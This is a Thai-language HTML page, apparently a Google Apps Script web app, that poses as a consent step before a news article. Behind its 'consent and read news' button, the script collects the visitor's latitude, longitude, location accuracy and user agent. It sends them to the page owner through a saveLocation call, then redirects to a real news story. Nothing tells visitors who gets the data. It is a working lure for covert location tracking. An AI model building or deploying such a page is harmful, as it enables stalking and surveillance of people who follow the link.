<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8">
  <base target="_top">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>อ่านข่าวต่อ</title>

  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      padding: 20px;
      color: #222;
    }

    .card {
      max-width: 480px;
      margin: 40px auto;
      background: #fff;
      border-radius: 16px;
      padding: 24px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.08);
    }

    h1 {
      font-size: 22px;
      margin-bottom: 12px;
    }

    p {
      line-height: 1.6;
      color: #555;
    }

    button {
      width: 100%;
      padding: 14px;
      border-radius: 12px;
      border: none;
      font-size: 16px;
      margin-top: 10px;
      cursor: pointer;
    }

    .primary {
      background: #111;
      color: white;
    }

    .secondary {
      background: #eee;
      color: #222;
    }

    .status {
      margin-top: 15px;
      padding: 12px;
      background: #f1f1f1;
      border-radius: 10px;
      display: none;
      line-height: 1.5;
    }
  </style>
</head>

<body>
  <div class="card">
    <h1>ก่อนอ่านข่าวต่อ</h1>

    <p>
      กดเพื่ออ่านข่าวต่อ
    </p>

    <button class="primary" onclick="allowLocation()">
      ยินยอมและอ่านข่าวต่อ
    </button>

    <button class="secondary" onclick="skipLocation()">
      อ่านข่าวโดยไม่ส่งตำแหน่ง
    </button>

    <div id="status" class="status"></div>
  </div>

  <script>
    const newsUrl = "https://www.khaosod.co.th/breaking-news/news_10236751#google_vignette";

    function showStatus(text) {
      const el = document.getElementById("status");
      el.style.display = "block";
      el.innerText = text;
    }

    function skipLocation() {
      window.location.href = newsUrl;
    }

    function allowLocation() {
      if (!navigator.geolocation) {
        showStatus("อุปกรณ์นี้ไม่รองรับการระบุตำแหน่ง กำลังพาไปยังหน้าข่าว...");
        setTimeout(() => window.location.href = newsUrl, 1500);
        return;
      }

      showStatus("กำลังขออนุญาตตำแหน่ง...");

      navigator.geolocation.getCurrentPosition(
        function(position) {
          const data = {
            lat: position.coords.latitude,
            lng: position.coords.longitude,
            accuracy: position.coords.accuracy,
            userAgent: navigator.userAgent,
            sourceUrl: newsUrl
          };

          showStatus("ได้รับข้อมูลแล้ว กำลังพาไปยังหน้าข่าว...");

          google.script.run
            .withSuccessHandler(function() {
              window.location.href = newsUrl;
            })
            .withFailureHandler(function() {
              window.location.href = newsUrl;
            })
            .saveLocation(data);
        },
        function() {
          showStatus("ไม่ได้รับอนุญาตตำแหน่ง กำลังพาไปยังหน้าข่าว...");
          setTimeout(() => window.location.href = newsUrl, 1500);
        },
        {
          enableHighAccuracy: false,
          timeout: 10000,
          maximumAge: 60000
        }
      );
    }
  </script>
</body>
</html>
